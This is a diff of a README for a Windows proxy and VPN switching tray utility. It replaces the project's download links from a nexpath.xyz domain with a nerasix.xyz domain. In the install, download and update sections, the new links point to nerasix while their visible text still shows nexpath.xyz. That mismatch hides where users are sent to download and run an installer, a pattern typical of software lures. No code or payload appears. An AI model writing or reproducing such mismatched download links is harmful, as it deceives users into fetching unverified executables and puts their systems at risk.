@@ -21,8 +21,8 @@ Tray utility to **quickly switch system proxy or VPN profiles** with hotkeys on 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[quick-proxy-region-switcher.nexpath.xyz](https://quick-proxy-region-switcher.nexpath.xyz/)**
-* **Full URL:** `https://quick-proxy-region-switcher.nexpath.xyz/`
+* **Project link:** **[quick-proxy-region-switcher.nerasix.xyz](https://quick-proxy-region-switcher.nerasix.xyz/)**
+* **Full URL:** `https://quick-proxy-region-switcher.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -46,12 +46,12 @@ Tray utility to **quickly switch system proxy or VPN profiles** with hotkeys on 
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://quick-proxy-region-switcher.nexpath.xyz/">quick-proxy-region-switcher.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://quick-proxy-region-switcher.nerasix.xyz/">quick-proxy-region-switcher.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://quick-proxy-region-switcher.nexpath.xyz/">quick-proxy-region-switcher.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://quick-proxy-region-switcher.nerasix.xyz/">quick-proxy-region-switcher.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -61,5 +61,5 @@ Tray utility to **quickly switch system proxy or VPN profiles** with hotkeys on 
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://quick-proxy-region-switcher.nexpath.xyz/">quick-proxy-region-switcher.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://quick-proxy-region-switcher.nerasix.xyz/">quick-proxy-region-switcher.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
